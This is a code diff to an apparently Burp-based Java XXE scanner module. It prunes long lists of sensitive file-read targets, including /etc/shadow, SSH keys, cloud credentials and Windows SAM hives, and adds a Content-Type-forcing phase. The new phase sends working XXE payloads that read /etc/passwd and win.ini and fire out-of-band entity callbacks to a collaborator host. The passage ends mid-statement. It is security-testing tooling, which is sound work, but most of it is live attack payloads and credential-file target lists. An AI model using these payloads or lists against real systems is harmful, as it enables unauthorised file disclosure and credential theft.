@@ -73,233 +73,29 @@ public class XxeScanner implements ScanModule {
 
     // ==================== CONSTANTS: FILE READ TARGETS ====================
 
-    /** Linux file targets: each entry is {filePath, evidencePattern, description}. */
+    /**
+     * Linux file targets — minimal high-confidence set.
+     * Each entry: {filePath, evidencePattern, description}.
+     * Only need a few files to prove XXE works. The attack technique diversity
+     * (SYSTEM, PUBLIC, error-based, OOB, XInclude, CT-forcing) is what matters.
+     */
     private static final String[][] LINUX_FILE_TARGETS = {
             {"/etc/passwd", "root:x:0:0:", "/etc/passwd"},
             {"/etc/hostname", "", "/etc/hostname"},
-            {"/etc/shadow", "root:", "/etc/shadow"},
-            {"/etc/group", "root:", "/etc/group"},
-            {"/etc/hosts", "localhost", "/etc/hosts"},
-            {"/etc/resolv.conf", "nameserver", "/etc/resolv.conf"},
-            {"/proc/version", "Linux version", "/proc/version"},
             {"/proc/self/environ", "PATH=", "/proc/self/environ"},
-            {"/proc/self/cmdline", "", "/proc/self/cmdline"},
-            {"/etc/os-release", "NAME=", "/etc/os-release"},
-            {"/etc/issue", "", "/etc/issue"},
-            {"/etc/nginx/nginx.conf", "server", "/etc/nginx/nginx.conf"},
-            {"/etc/apache2/apache2.conf", "ServerRoot", "/etc/apache2/apache2.conf"},
-            {"/var/log/apache2/access.log", "", "/var/log/apache2/access.log"},
-            {"/etc/crontab", "", "/etc/crontab"},
-            {"/proc/self/status", "Name:", "/proc/self/status"},
-            {"/proc/net/tcp", "", "/proc/net/tcp"},
-            {"/etc/mysql/my.cnf", "[mysqld]", "/etc/mysql/my.cnf"},
-            {"/etc/postgresql/pg_hba.conf", "", "/etc/postgresql/pg_hba.conf"},
-            {"/home/.ssh/authorized_keys", "", "/home/.ssh/authorized_keys"},
-            {"/root/.bash_history", "", "/root/.bash_history"},
-            {"/etc/redis/redis.conf", "", "/etc/redis/redis.conf"},
-            {"/etc/fstab", "", "/etc/fstab"},
-            {"/etc/profile", "", "/etc/profile"},
-            {"/etc/bashrc", "", "/etc/bashrc"},
-            {"/etc/environment", "PATH", "/etc/environment"},
-            {"/etc/security/limits.conf", "", "/etc/security/limits.conf"},
-            {"/etc/sysctl.conf", "", "/etc/sysctl.conf"},
-            {"/etc/ssh/sshd_config", "", "/etc/ssh/sshd_config"},
-            {"/etc/ssh/ssh_config", "", "/etc/ssh/ssh_config"},
-            {"/root/.ssh/authorized_keys", "", "/root/.ssh/authorized_keys"},
-            {"/root/.ssh/id_rsa", "-----BEGIN", "/root/.ssh/id_rsa"},
-            {"/root/.ssh/id_rsa.pub", "ssh-rsa", "/root/.ssh/id_rsa.pub"},
-            {"/root/.ssh/known_hosts", "", "/root/.ssh/known_hosts"},
-            {"/proc/self/fd/0", "", "/proc/self/fd/0"},
-            {"/proc/self/maps", "", "/proc/self/maps"},
-            {"/proc/self/mountinfo", "", "/proc/self/mountinfo"},
-            {"/proc/self/cgroup", "", "/proc/self/cgroup"},
-            {"/proc/mounts", "", "/proc/mounts"},
-            {"/proc/cpuinfo", "processor", "/proc/cpuinfo"},
-            {"/proc/meminfo", "MemTotal", "/proc/meminfo"},
-            {"/proc/net/arp", "", "/proc/net/arp"},
-            {"/proc/net/route", "Iface", "/proc/net/route"},
-            {"/proc/net/udp", "", "/proc/net/udp"},
-            {"/proc/net/if_inet6", "", "/proc/net/if_inet6"},
-            {"/proc/sched_debug", "", "/proc/sched_debug"},
-            {"/etc/lsb-release", "", "/etc/lsb-release"},
-            {"/etc/redhat-release", "", "/etc/redhat-release"},
-            {"/etc/debian_version", "", "/etc/debian_version"},
-            {"/etc/alpine-release", "", "/etc/alpine-release"},
-            {"/etc/httpd/conf/httpd.conf", "ServerRoot", "/etc/httpd/conf/httpd.conf"},
-            {"/etc/lighttpd/lighttpd.conf", "", "/etc/lighttpd/lighttpd.conf"},
-            {"/etc/tomcat/server.xml", "", "/etc/tomcat/server.xml"},
-            {"/opt/tomcat/conf/server.xml", "", "/opt/tomcat/conf/server.xml"},
-            {"/opt/tomcat/conf/tomcat-users.xml", "", "/opt/tomcat/conf/tomcat-users.xml"},
-            {"/usr/local/tomcat/conf/server.xml", "", "/usr/local/tomcat/conf/server.xml"},
-            {"/usr/local/tomcat/conf/tomcat-users.xml", "", "/usr/local/tomcat/conf/tomcat-users.xml"},
-            {"/etc/php/7.4/apache2/php.ini", "[PHP]", "/etc/php/7.4/apache2/php.ini"},
-            {"/etc/php/8.0/apache2/php.ini", "[PHP]", "/etc/php/8.0/apache2/php.ini"},
-            {"/etc/php/8.1/apache2/php.ini", "[PHP]", "/etc/php/8.1/apache2/php.ini"},
-            {"/etc/php/8.2/apache2/php.ini", "[PHP]", "/etc/php/8.2/apache2/php.ini"},
-            {"/usr/local/etc/php/php.ini", "[PHP]", "/usr/local/etc/php/php.ini"},
-            {"/etc/mongod.conf", "", "/etc/mongod.conf"},
-            {"/etc/redis.conf", "", "/etc/redis.conf"},
-            {"/etc/elasticsearch/elasticsearch.yml", "", "/etc/elasticsearch/elasticsearch.yml"},
-            {"/etc/docker/daemon.json", "", "/etc/docker/daemon.json"},
-            {"/var/run/docker.sock", "", "/var/run/docker.sock"},
-            {"/etc/kubernetes/admin.conf", "", "/etc/kubernetes/admin.conf"},
-            {"/var/run/secrets/kubernetes.io/serviceaccount/token", "", "/var/run/secrets/kubernetes.io/serviceaccount/token"},
-            {"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt", "", "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"},
-            {"/var/run/secrets/kubernetes.io/serviceaccount/namespace", "", "/var/run/secrets/kubernetes.io/serviceaccount/namespace"},
-            {"/etc/mysql/mariadb.conf.d/50-server.cnf", "", "/etc/mysql/mariadb.conf.d/50-server.cnf"},
-            {"/var/lib/mysql/mysql/user.MYD", "", "/var/lib/mysql/mysql/user.MYD"},
-            {"/etc/postfix/main.cf", "", "/etc/postfix/main.cf"},
-            {"/etc/dovecot/dovecot.conf", "", "/etc/dovecot/dovecot.conf"},
-            {"/etc/vsftpd.conf", "", "/etc/vsftpd.conf"},
-            {"/etc/proftpd/proftpd.conf", "", "/etc/proftpd/proftpd.conf"},
-            {"/etc/bind/named.conf", "", "/etc/bind/named.conf"},
-            {"/etc/named.conf", "", "/etc/named.conf"},
-            {"/etc/ldap/ldap.conf", "", "/etc/ldap/ldap.conf"},
-            {"/etc/openldap/slapd.conf", "", "/etc/openldap/slapd.conf"},
-            {"/etc/samba/smb.conf", "", "/etc/samba/smb.conf"},
-            {"/etc/exports", "", "/etc/exports"},
-            {"/var/log/syslog", "", "/var/log/syslog"},
-            {"/var/log/auth.log", "", "/var/log/auth.log"},
-            {"/var/log/messages", "", "/var/log/messages"},
-            {"/var/log/secure", "", "/var/log/secure"},
-            {"/var/log/nginx/access.log", "", "/var/log/nginx/access.log"},
-            {"/var/log/nginx/error.log", "", "/var/log/nginx/error.log"},
-            {"/var/log/apache2/error.log", "", "/var/log/apache2/error.log"},
-            {"/var/log/httpd/access_log", "", "/var/log/httpd/access_log"},
-            {"/var/log/httpd/error_log", "", "/var/log/httpd/error_log"},
-            {"/var/log/mail.log", "", "/var/log/mail.log"},
-            {"/etc/supervisor/supervisord.conf", "", "/etc/supervisor/supervisord.conf"},
-            {"/etc/pam.d/common-auth", "", "/etc/pam.d/common-auth"},
-            {"/etc/pam.d/common-password", "", "/etc/pam.d/common-password"},
-            {"/etc/login.defs", "", "/etc/login.defs"},
-            {"/etc/sudoers", "", "/etc/sudoers"},
-            {"/etc/xinetd.conf", "", "/etc/xinetd.conf"},
-            {"/etc/inetd.conf", "", "/etc/inetd.conf"},
-            {"/etc/network/interfaces", "", "/etc/network/interfaces"},
-            {"/etc/NetworkManager/NetworkManager.conf", "", "/etc/NetworkManager/NetworkManager.conf"},
-            {"/etc/apt/sources.list", "", "/etc/apt/sources.list"},
-            {"/etc/yum.conf", "", "/etc/yum.conf"},
-            {"/etc/proxychains.conf", "", "/etc/proxychains.conf"},
-            {"/home/www-data/.bash_history", "", "/home/www-data/.bash_history"},
-            {"/home/ubuntu/.bash_history", "", "/home/ubuntu/.bash_history"},
-            {"/var/www/html/.htaccess", "", "/var/www/html/.htaccess"},
-            {"/var/www/.htpasswd", "", "/var/www/.htpasswd"},
-            {"/var/www/html/wp-config.php", "", "/var/www/html/wp-config.php"},
-            {"/var/www/html/configuration.php", "", "/var/www/html/configuration.php"},
-            {"/var/www/html/config.php", "", "/var/www/html/config.php"},
-            {"/opt/bitnami/apps/wordpress/htdocs/wp-config.php", "", "/opt/bitnami/wordpress/wp-config.php"},
-            {"/etc/ansible/hosts", "", "/etc/ansible/hosts"},
-            {"/etc/salt/master", "", "/etc/salt/master"},
-            {"/etc/puppet/puppet.conf", "", "/etc/puppet/puppet.conf"},
-            {"/home/git/.gitconfig", "", "/home/git/.gitconfig"},
-            {"/etc/gitlab/gitlab.rb", "", "/etc/gitlab/gitlab.rb"},
-            {"/etc/grafana/grafana.ini", "", "/etc/grafana/grafana.ini"},
-            {"/etc/prometheus/prometheus.yml", "", "/etc/prometheus/prometheus.yml"},
-            {"/etc/consul.d/config.json", "", "/etc/consul.d/config.json"},
-            {"/etc/vault/config.hcl", "", "/etc/vault/config.hcl"},
-            {"/etc/rabbitmq/rabbitmq.config", "", "/etc/rabbitmq/rabbitmq.config"},
-            {"/etc/kafka/server.properties", "", "/etc/kafka/server.properties"},
-            {"/etc/zookeeper/conf/zoo.cfg", "", "/etc/zookeeper/conf/zoo.cfg"},
-            {"/etc/cassandra/cassandra.yaml", "", "/etc/cassandra/cassandra.yaml"},
-            {"/etc/couchdb/local.ini", "", "/etc/couchdb/local.ini"},
-            {"/etc/neo4j/neo4j.conf", "", "/etc/neo4j/neo4j.conf"},
-            {"/opt/solr/server/solr/solr.xml", "", "/opt/solr/server/solr/solr.xml"},
-            {"/etc/haproxy/haproxy.cfg", "", "/etc/haproxy/haproxy.cfg"},
-            {"/etc/squid/squid.conf", "", "/etc/squid/squid.conf"},
-            {"/etc/varnish/default.vcl", "", "/etc/varnish/default.vcl"},
-            {"/etc/openvpn/server.conf", "", "/etc/openvpn/server.conf"},
-            {"/etc/wireguard/wg0.conf", "", "/etc/wireguard/wg0.conf"},
-            {"/etc/ipsec.conf", "", "/etc/ipsec.conf"},
-            {"/etc/snmp/snmpd.conf", "", "/etc/snmp/snmpd.conf"},
-            {"/etc/nagios/nagios.cfg", "", "/etc/nagios/nagios.cfg"},
-            {"/etc/zabbix/zabbix_server.conf", "", "/etc/zabbix/zabbix_server.conf"},
-            {"/root/.my.cnf", "", "/root/.my.cnf"},
-            {"/root/.pgpass", "", "/root/.pgpass"},
-            {"/root/.mongorc.js", "", "/root/.mongorc.js"},
-            {"/root/.aws/credentials", "", "/root/.aws/credentials"},
-            {"/root/.aws/config", "", "/root/.aws/config"},
-            {"/home/ubuntu/.aws/credentials", "", "/home/ubuntu/.aws/credentials"},
-            {"/root/.docker/config.json", "", "/root/.docker/config.json"},
-            {"/root/.kube/config", "", "/root/.kube/config"},
-            {"/root/.gitconfig", "", "/root/.gitconfig"},
-            {"/root/.npmrc", "", "/root/.npmrc"},
-            {"/root/.env", "", "/root/.env"},
-            {"/opt/app/.env", "", "/opt/app/.env"},
-            {"/var/www/.env", "", "/var/www/.env"},
-            {"/var/www/html/.env", "", "/var/www/html/.env"},
-            {"/app/.env", "", "/app/.env"},
-            {"/proc/1/cmdline", "", "/proc/1/cmdline"},
-            {"/proc/1/environ", "", "/proc/1/environ"},
-            {"/proc/self/exe", "", "/proc/self/exe"},
+            {"/etc/shadow", "root:", "/etc/shadow"},
     };
 
-    /** Windows file targets: each entry is {filePath, evidencePattern, description}. */
+    /**
+     * Windows file targets — minimal high-confidence set.
+     * Each entry: {filePath, evidencePattern, description}.
+     * Only need a few files to prove XXE works.
+     */
     private static final String[][] WINDOWS_FILE_TARGETS = {
             {"C:/Windows/win.ini", "[fonts]", "C:\\Windows\\win.ini"},
             {"C:/Windows/System32/drivers/etc/hosts", "localhost", "C:\\Windows\\System32\\drivers\\etc\\hosts"},
-            {"C:/boot.ini", "[boot loader]", "C:\\boot.ini"},
             {"C:/Windows/system.ini", "[drivers]", "C:\\Windows\\system.ini"},
-            {"C:/Windows/php.ini", "[PHP]", "C:\\Windows\\php.ini"},
             {"C:/inetpub/wwwroot/web.config", "configuration", "C:\\inetpub\\wwwroot\\web.config"},
-            {"C:/Windows/debug/NetSetup.log", "", "C:\\Windows\\debug\\NetSetup.log"},
-            {"C:/Windows/repair/sam", "", "C:\\Windows\\repair\\sam"},
-            {"C:/Windows/Panther/Unattend.xml", "", "C:\\Windows\\Panther\\Unattend.xml"},
-            {"C:/Windows/Panther/unattend.xml", "", "C:\\Windows\\Panther\\unattend.xml"},
-            {"C:/inetpub/logs/LogFiles", "", "C:\\inetpub\\logs\\LogFiles"},
-            {"C:/xampp/apache/conf/httpd.conf", "ServerRoot", "C:\\xampp\\apache\\conf\\httpd.conf"},
-            {"C:/ProgramData/MySQL/MySQL Server 5.7/my.ini", "", "C:\\ProgramData\\MySQL\\my.ini"},
-            {"C:/Windows/System32/inetsrv/config/applicationHost.config", "", "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"},
-            {"C:/Windows/repair/system", "", "C:\\Windows\\repair\\system"},
-            {"C:/Windows/repair/security", "", "C:\\Windows\\repair\\security"},
-            {"C:/Windows/repair/software", "", "C:\\Windows\\repair\\software"},
-            {"C:/Windows/repair/default", "", "C:\\Windows\\repair\\default"},
-            {"C:/Windows/System32/config/SAM", "", "C:\\Windows\\System32\\config\\SAM"},
-            {"C:/Windows/System32/config/SYSTEM", "", "C:\\Windows\\System32\\config\\SYSTEM"},
-            {"C:/Windows/System32/config/SOFTWARE", "", "C:\\Windows\\System32\\config\\SOFTWARE"},
-            {"C:/Windows/System32/config/SECURITY", "", "C:\\Windows\\System32\\config\\SECURITY"},
-            {"C:/Windows/System32/config/RegBack/SAM", "", "C:\\Windows\\System32\\config\\RegBack\\SAM"},
-            {"C:/Windows/System32/config/RegBack/SYSTEM", "", "C:\\Windows\\System32\\config\\RegBack\\SYSTEM"},
-            {"C:/Windows/System32/WindowsPowerShell/v1.0/profile.ps1", "", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1"},
-            {"C:/Users/Administrator/NTUser.dat", "", "C:\\Users\\Administrator\\NTUser.dat"},
-            {"C:/Users/Administrator/Desktop/desktop.ini", "", "C:\\Users\\Administrator\\Desktop\\desktop.ini"},
-            {"C:/Users/Administrator/.ssh/authorized_keys", "", "C:\\Users\\Administrator\\.ssh\\authorized_keys"},
-            {"C:/Users/Administrator/.ssh/id_rsa", "-----BEGIN", "C:\\Users\\Administrator\\.ssh\\id_rsa"},
-            {"C:/Users/All Users/Application Data/MySQL/MySQL Server 5.7/my.ini", "", "C:\\ProgramData\\MySQL\\5.7\\my.ini"},
-            {"C:/ProgramData/MySQL/MySQL Server 8.0/my.ini", "", "C:\\ProgramData\\MySQL\\8.0\\my.ini"},
-            {"C:/xampp/mysql/bin/my.ini", "", "C:\\xampp\\mysql\\bin\\my.ini"},
-            {"C:/xampp/phpMyAdmin/config.inc.php", "", "C:\\xampp\\phpMyAdmin\\config.inc.php"},
-            {"C:/xampp/sendmail/sendmail.ini", "", "C:\\xampp\\sendmail\\sendmail.ini"},
-            {"C:/xampp/apache/conf/extra/httpd-vhosts.conf", "", "C:\\xampp\\apache\\conf\\extra\\httpd-vhosts.conf"},
-            {"C:/xampp/php/php.ini", "[PHP]", "C:\\xampp\\php\\php.ini"},
-            {"C:/wamp/bin/apache/apache2.4.9/conf/httpd.conf", "ServerRoot", "C:\\wamp\\bin\\apache\\conf\\httpd.conf"},
-            {"C:/wamp/bin/php/php5.5.12/php.ini", "[PHP]", "C:\\wamp\\bin\\php\\php.ini"},
-            {"C:/inetpub/wwwroot/default.aspx", "", "C:\\inetpub\\wwwroot\\default.aspx"},
-            {"C:/inetpub/wwwroot/global.asa", "", "C:\\inetpub\\wwwroot\\global.asa"},
-            {"C:/Windows/Microsoft.NET/Framework/v4.0.30319/Config/machine.config", "", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\machine.config"},
-            {"C:/Windows/Microsoft.NET/Framework/v4.0.30319/Config/web.config", "", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\web.config"},
-            {"C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config", "", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config"},
-            {"C:/Program Files/Apache Software Foundation/Tomcat 9.0/conf/server.xml", "", "C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0\\conf\\server.xml"},
-            {"C:/Program Files/Apache Software Foundation/Tomcat 9.0/conf/tomcat-users.xml", "", "C:\\Program Files\\Tomcat 9.0\\conf\\tomcat-users.xml"},
-            {"C:/Program Files/Apache Software Foundation/Tomcat 9.0/conf/web.xml", "", "C:\\Program Files\\Tomcat 9.0\\conf\\web.xml"},
-            {"C:/Program Files (x86)/Apache Software Foundation/Tomcat 9.0/conf/server.xml", "", "C:\\Program Files (x86)\\Tomcat 9.0\\conf\\server.xml"},
-            {"C:/Windows/Temp", "", "C:\\Windows\\Temp"},
-            {"C:/Windows/WindowsUpdate.log", "", "C:\\Windows\\WindowsUpdate.log"},
-            {"C:/Windows/System32/sysprep/sysprep.xml", "", "C:\\Windows\\System32\\sysprep\\sysprep.xml"},
-            {"C:/Windows/System32/sysprep/unattend.xml", "", "C:\\Windows\\System32\\sysprep\\unattend.xml"},
-            {"C:/Program Files/MySQL/MySQL Server 5.7/my.ini", "", "C:\\Program Files\\MySQL\\5.7\\my.ini"},
-            {"C:/Program Files/MySQL/MySQL Server 8.0/my.ini", "", "C:\\Program Files\\MySQL\\8.0\\my.ini"},
-            {"C:/Program Files/PostgreSQL/14/data/pg_hba.conf", "", "C:\\Program Files\\PostgreSQL\\14\\data\\pg_hba.conf"},
-            {"C:/Program Files/PostgreSQL/14/data/postgresql.conf", "", "C:\\Program Files\\PostgreSQL\\14\\data\\postgresql.conf"},
-            {"C:/Program Files/Microsoft SQL Server/MSSQL15.MSSQLSERVER/MSSQL/LOG/ERRORLOG", "", "C:\\Program Files\\Microsoft SQL Server\\MSSQL\\LOG\\ERRORLOG"},
-            {"C:/Program Files/Redis/redis.windows.conf", "", "C:\\Program Files\\Redis\\redis.windows.conf"},
-            {"C:/Program Files/OpenSSH/etc/sshd_config", "", "C:\\Program Files\\OpenSSH\\etc\\sshd_config"},
-            {"C:/ProgramData/Jenkins/.jenkins/secrets/master.key", "", "C:\\ProgramData\\Jenkins\\.jenkins\\secrets\\master.key"},
-            {"C:/ProgramData/Jenkins/.jenkins/secrets/initialAdminPassword", "", "C:\\ProgramData\\Jenkins\\.jenkins\\secrets\\initialAdminPassword"},
-            {"C:/Users/Administrator/.aws/credentials", "", "C:\\Users\\Administrator\\.aws\\credentials"},
-            {"C:/Users/Administrator/.azure/accessTokens.json", "", "C:\\Users\\Administrator\\.azure\\accessTokens.json"},
-            {"C:/Users/Administrator/.kube/config", "", "C:\\Users\\Administrator\\.kube\\config"},
-            {"C:/Users/Administrator/.docker/config.json", "", "C:\\Users\\Administrator\\.docker\\config.json"},
-            {"C:/Windows/System32/LogFiles/W3SVC1/u_ex210101.log", "", "C:\\Windows\\System32\\LogFiles\\W3SVC1\\IIS_log"},
     };
 
     // ==================== CONSTANTS: XML PARSER ERROR PATTERNS ====================
@@ -604,6 +400,26 @@ public class XxeScanner implements ScanModule {
                     testContentTypeConversion(requestResponse, url);
                 } catch (Exception e) {
                     api.logging().logToError("XXE Content-Type conversion test error: " + e.getMessage());
+                }
+            }
+        }
+
+        // Phase 4: Content-Type forcing — for non-XML, non-JSON requests that have a body
+        // (e.g., application/x-www-form-urlencoded, multipart/form-data).
+        // Many frameworks (Rails, Spring, JAX-RS, Express) auto-detect Content-Type and will
+        // parse XML if you simply switch the Content-Type header. Send a minimal XXE probe
+        // as XML to check if the server processes it.
+        if (oobConfirmedParams.contains("xml_body")) return Collections.emptyList();
+        if (config.getBool("xxe.contentTypeForcing.enabled", true) && !isXmlRequest && !isJsonRequest) {
+            String body = null;
+            try { body = request.bodyToString(); } catch (Exception ignored) {}
+            if (body != null && !body.trim().isEmpty()) {
+                if (dedup.markIfNew("xxe-force-ct", urlPath, "__force_xml__")) {
+                    try {
+                        testContentTypeForcing(requestResponse, url, fingerprint);
+                    } catch (Exception e) {
+                        api.logging().logToError("XXE Content-Type forcing test error: " + e.getMessage());
+                    }
                 }
             }
         }
@@ -2019,6 +1835,262 @@ public class XxeScanner implements ScanModule {
         }
     }
 
+    // ==================== PHASE 4: CONTENT-TYPE FORCING ====================
+
+    /**
+     * Tests if a non-XML endpoint accepts XML by forcing the Content-Type to application/xml.
+     * Targets form-urlencoded, multipart, and other non-XML/non-JSON requests.
+     *
+     * Strategy:
+     * 1. Send a minimal XML probe with the forced Content-Type.
+     *    If server returns 415 (Unsupported Media Type), stop — it rejects XML.
+     * 2. If accepted, send a basic internal entity expansion probe to confirm XML parsing.
+     * 3. If XML parsing confirmed, run classic file read + OOB payloads.
+     */
+    private void testContentTypeForcing(HttpRequestResponse original, String url,
+                                         TargetFingerprint fingerprint) throws InterruptedException {
+
+        // Step 1: Probe with a minimal XML body to see if the server accepts it
+        String probeXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<root>test</root>";
+        String[] xmlContentTypes = {"application/xml", "text/xml"};
+        String acceptedCt = null;
+        HttpRequestResponse probeResult = null;
+
+        for (String ct : xmlContentTypes) {
+            HttpRequest probeRequest = original.request()
+                    .withRemovedHeader("Content-Type")
+                    .withAddedHeader("Content-Type", ct)
+                    .withBody(probeXml);
+
+            try {
+                probeResult = api.http().sendRequest(probeRequest);
+            } catch (Exception e) {
+                continue;
+            }
+            if (probeResult == null || probeResult.response() == null) continue;
+
+            int status = probeResult.response().statusCode();
+            // 415 = server explicitly rejects XML. 5xx with XML-specific error also means rejection.
+            if (status == 415) continue;
+            if (status >= 500) continue;
+
+            // Server didn't reject XML — worth probing further
+            acceptedCt = ct;
+            break;
+        }
+
+        if (acceptedCt == null) return; // Server rejects XML
+
+        perHostDelay();
+
+        // Step 2: Entity expansion probe — confirm the server actually parses XML entities
+        String entityProbeXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                + "<!DOCTYPE root [\n"
+                + "  <!ENTITY xxeprobe \"XXE_FORCE_PROBE_OK\">\n"
+                + "]>\n"
+                + "<root>&xxeprobe;</root>";
+
+        HttpRequest entityProbeRequest = original.request()
+                .withRemovedHeader("Content-Type")
+                .withAddedHeader("Content-Type", acceptedCt)
+                .withBody(entityProbeXml);
+
+        HttpRequestResponse entityResult = null;
+        boolean entityExpansionConfirmed = false;
+        boolean xmlProcessingLikely = false;
+        String probeResponseBody = "";
+
+        try {
+            entityResult = api.http().sendRequest(entityProbeRequest);
+        } catch (Exception e) {
+            return;
+        }
+
+        if (entityResult != null && entityResult.response() != null) {
+            probeResponseBody = entityResult.response().bodyToString();
+            if (probeResponseBody != null && probeResponseBody.contains("XXE_FORCE_PROBE_OK")) {
+                entityExpansionConfirmed = true;
+            }
+            // Even without entity expansion, XML processing errors indicate the server tried to parse
+            if (probeResponseBody != null && XML_PARSER_ERROR_PATTERN.matcher(probeResponseBody).find()) {
+                xmlProcessingLikely = true;
+            }
+        }
+
+        if (!entityExpansionConfirmed && !xmlProcessingLikely) {
+            // Server accepted the Content-Type but doesn't appear to parse XML — stop here
+            return;
+        }
+
+        // Report the Content-Type forcing acceptance
+        findingsStore.addFinding(Finding.builder("xxe-scanner",
+                        "Content-Type forcing accepted: non-XML endpoint parses XML",
+                        entityExpansionConfirmed ? Severity.HIGH : Severity.MEDIUM,
+                        entityExpansionConfirmed ? Confidence.CERTAIN : Confidence.FIRM)
+                .url(url).parameter("Content-Type")
+                .evidence("Original Content-Type: " + getContentType(original.request())
+                        + " | Forced to: " + acceptedCt
+                        + " | Entity expansion: " + (entityExpansionConfirmed ? "YES" : "no")
+                        + " | XML processing: " + (xmlProcessingLikely ? "YES" : "unknown"))
+                .description("The server accepted a forced XML Content-Type on an endpoint that normally "
+                        + "receives " + getContentType(original.request()) + ". "
+                        + (entityExpansionConfirmed
+                            ? "Entity expansion is confirmed — the XML parser processes DTD entities. "
+                            : "XML parser errors were detected, indicating the server processes XML. ")
+                        + "This widens the attack surface to XXE injection. "
+                        + "Remediation: Enforce strict Content-Type validation and reject unexpected types.")
+                .payload(entityProbeXml)
+                .responseEvidence(entityExpansionConfirmed ? "XXE_FORCE_PROBE_OK" : "")
+                .requestResponse(entityResult)
+                .build());
+
+        perHostDelay();
+
+        // Step 3: Run XXE payloads through the forced Content-Type
+        String baselineBody = probeResponseBody;
+
+        // 3a: Classic file read (only on reflective endpoints where entity expansion works)
+        if (entityExpansionConfirmed && config.getBool("xxe.classic.enabled", true)) {
+            // Linux /etc/passwd
+            String passwdDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<!DOCTYPE root [\n"
+                    + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
+                    + "]>\n"
+                    + "<root>&xxe;</root>";
+
+            HttpRequest passwdRequest = original.request()
+                    .withRemovedHeader("Content-Type")
+                    .withAddedHeader("Content-Type", acceptedCt)
+                    .withBody(passwdDtd);
+
+            try {
+                HttpRequestResponse passwdResult = api.http().sendRequest(passwdRequest);
+                if (passwdResult != null && passwdResult.response() != null) {
+                    String body = passwdResult.response().bodyToString();
+                    if (body != null && LINUX_PASSWD_EVIDENCE.matcher(body).find()
+                            && (baselineBody == null || !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find())) {
+                        findingsStore.addFinding(Finding.builder("xxe-scanner",
+                                        "XXE via Content-Type Forcing: /etc/passwd read",
+                                        Severity.CRITICAL, Confidence.CERTAIN)
+                                .url(url).parameter("Content-Type forcing")
+                                .evidence("Forced XML Content-Type; XXE payload read /etc/passwd")
+                                .description("XXE injection confirmed via Content-Type forcing. "
+                                        + "The non-XML endpoint accepted XML and processed external entities. "
+                                        + "/etc/passwd content was returned.")
+                                .payload(passwdDtd)
+                                .responseEvidence("root:x:0:0:")
+                                .requestResponse(passwdResult)
+                                .build());
+                        return; // Confirmed — no need for more payloads
+                    }
+                }
+            } catch (Exception ignored) {}
+
+            perHostDelay();
+
+            // Windows win.ini
+            String winIniDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                    + "<!DOCTYPE root [\n"
+                    + "  <!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">\n"
+                    + "]>\n"
+                    + "<root>&xxe;</root>";
+
+            HttpRequest winIniRequest = original.request()
+                    .withRemovedHeader("Content-Type")
+                    .withAddedHeader("Content-Type", acceptedCt)
+                    .withBody(winIniDtd);
+
+            try {
+                HttpRequestResponse winIniResult = api.http().sendRequest(winIniRequest);
+                if (winIniResult != null && winIniResult.response() != null) {
+                    String body = winIniResult.response().bodyToString();
+                    if (body != null && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
+                            && (baselineBody == null || !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find())) {
+                        findingsStore.addFinding(Finding.builder("xxe-scanner",
+                                        "XXE via Content-Type Forcing: win.ini read",
+                                        Severity.CRITICAL, Confidence.CERTAIN)
+                                .url(url).parameter("Content-Type forcing")
+                                .evidence("Forced XML Content-Type; XXE payload read win.ini")
+                                .description("XXE injection confirmed via Content-Type forcing. "
+                                        + "The non-XML endpoint accepted XML. win.ini content was returned.")
+                                .payload(winIniDtd)
+                                .responseEvidence("[fonts]")
+                                .requestResponse(winIniResult)
+                                .build());
+                        return;
+                    }
+                }
+            } catch (Exception ignored) {}
+
+            perHostDelay();
+        }
+
+        // 3b: Blind XXE via OOB (Collaborator) — works even without entity reflection
+        if (config.getBool("xxe.oob.enabled", true)
+                && collaboratorManager != null && collaboratorManager.isAvailable()) {
+
+            // Parameter entity OOB
+            final String finalAcceptedCt = acceptedCt;
+            AtomicReference<HttpRequestResponse> sentForceOob1 = new AtomicReference<>();
+            String collabPayload1 = collaboratorManager.generatePayload(
+                    "xxe-scanner", url, "Content-Type forcing",
+                    "XXE OOB via Content-Type forcing (parameter entity)",
+                    interaction -> {
+                        oobConfirmedParams.add("Content-Type forcing");
+                        reportOobFinding(interaction, url,
+                                "Content-Type forcing parameter entity OOB", sentForceOob1.get());
+                    });
+            if (collabPayload1 != null) {
+                String oobDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+                        + "<!DOCTYPE root [\n"
+                        + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload1 + "/xxe\">\n"
+                        + "  %xxe;\n"
+                        + "]>\n"
+                        + "<root>test</root>";
+
+                HttpRequest oobRequest = original.request()
+                        .withRemovedHeader("Content-Type")
+                        .withAddedHeader("Content-Type", finalAcceptedCt)
+                        .withBody(oobDtd);
+                try {
+                    HttpRequestResponse oobResult = api.http().sendRequest(oobRequest);
+                    sentForceOob1.set(oobResult);
+                } catch (Exception ignored) {}
+
+                perHostDelay();
+            }
+
+            // Direct entity OOB
+            AtomicReference<HttpRequestResponse> sentForceOob2 = new AtomicReference<>();
+            String collabPayload2 = collaboratorManager.generatePayload(
+                    "xxe-scanner", url, "Content-Type forcing",
+                    "XXE OOB via Content-Type forcing (direct entity)",
+                    interaction -> {
+                        oobConfirmedParams.add("Content-Type forcing");
+                        reportOobFinding(interaction, url,
+                                "Content-Type forcing direct entity OOB", sentForceOob2.get());
+                    });
+            if (collabPayload2 != null) {
+                String directOobDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
